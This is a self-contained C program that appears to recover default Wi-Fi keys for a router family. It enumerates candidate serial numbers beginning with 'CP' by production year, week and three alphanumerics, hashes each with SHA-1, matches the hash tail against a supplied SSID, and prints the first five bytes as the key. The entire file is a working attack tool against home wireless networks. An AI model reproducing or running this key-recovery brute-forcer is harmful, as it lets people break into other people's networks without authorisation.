#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <ctype.h>
#include <openssl/sha.h>

#define DEFAULT_KEY_SIZE 5
#define MAX_SSID_SIZE SHA_DIGEST_LENGTH
#define SERIAL_LENGTH 12
#define WEEKS_PER_YEAR 52

static const char ALPHANUMERICS[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
#define ALPHANUMERIC_COUNT (sizeof(ALPHANUMERICS) / sizeof(*ALPHANUMERICS) - 1)

static const char HEXADECIMALS[] = "0123456789ABCDEF";
#define HEXMSB(x) (HEXADECIMALS[((x & 0xf0) >> 4)])
#define HEXLSB(x) (HEXADECIMALS[(x & 0x0f)])

static uint8_t ssid[MAX_SSID_SIZE];
static size_t ssid_length;

void read_ssid(char *source) {
    uint8_t *result = ssid;
    size_t length = strlen(source);

    char *p;
    for (p = source; *p != 0; p++) {
        int hex = strchr(HEXADECIMALS, *p) - HEXADECIMALS;
        if (--length % 2)
            *result = hex << 4;
        else
            *result++ |= hex;
    }

    ssid_length = (p - source) / 2;
}

void bruteforce(int start_year, int end_year) {
    uint8_t serial[SERIAL_LENGTH];

    serial[0] = 'C';
    serial[1] = 'P';

    for (int year = start_year; year <= end_year; year++) {
        serial[2] = (year / 10) | '0';
        serial[3] = (year % 10) | '0';

        for (int week = 1; week <= WEEKS_PER_YEAR; week++) {
            serial[4] = (week / 10) + '0';
            serial[5] = (week % 10) + '0';

            for (int x1 = 0; x1 < ALPHANUMERIC_COUNT; x1++) {
                serial[6] = HEXMSB(ALPHANUMERICS[x1]);
                serial[7] = HEXLSB(ALPHANUMERICS[x1]);

                for (int x2 = 0; x2 < ALPHANUMERIC_COUNT; x2++) {
                    serial[8] = HEXMSB(ALPHANUMERICS[x2]);
                    serial[9] = HEXLSB(ALPHANUMERICS[x2]);

                    for (int x3 = 0; x3 < ALPHANUMERIC_COUNT; x3++) {
                        serial[10] = HEXMSB(ALPHANUMERICS[x3]);
                        serial[11] = HEXLSB(ALPHANUMERICS[x3]);

                        SHA_CTX ctx;
                        uint8_t hash[SHA_DIGEST_LENGTH];

                        SHA1_Init(&ctx);
                        SHA1_Update(&ctx, serial, SERIAL_LENGTH);
                        SHA1_Final(hash, &ctx);

                        if (memcmp(&hash[SHA_DIGEST_LENGTH - ssid_length],
                                    &ssid, ssid_length) == 0) {
                            for (int i = 0; i < DEFAULT_KEY_SIZE; i++)
                                printf("%.2X", hash[i]);
                            puts("");
                        }
                    }
                }
            }
        }
    }
}

int main(int argc, char *argv[]) {
    if (argc < 2 || argc > 4) {
        printf("Usage: %s <SSID> [start year] [end year]\n", argv[0]);
        return 0;
    }

    size_t hex_ssid_length = strlen(argv[1]);
    if (hex_ssid_length % 2 || hex_ssid_length / 2 > MAX_SSID_SIZE) {
        fprintf(stderr, "Invalid SSID length\n");
        return 1;
    }
    for (size_t i = 0; i < hex_ssid_length; i++) {
        if (!isxdigit(argv[1][i])) {
            fprintf(stderr, "Invalid SSID\n");
            return 1;
        }
        argv[1][i] = toupper(argv[1][i]);
    }
    read_ssid(argv[1]);

    int start_year;
    int end_year;
    if (argc < 3)
        start_year = 2;
    else
        start_year = atoi(argv[2]);
    if (argc < 4)
        end_year = 10;
    else
        end_year = atoi(argv[3]);

    bruteforce(start_year, end_year);

    return 0;
}
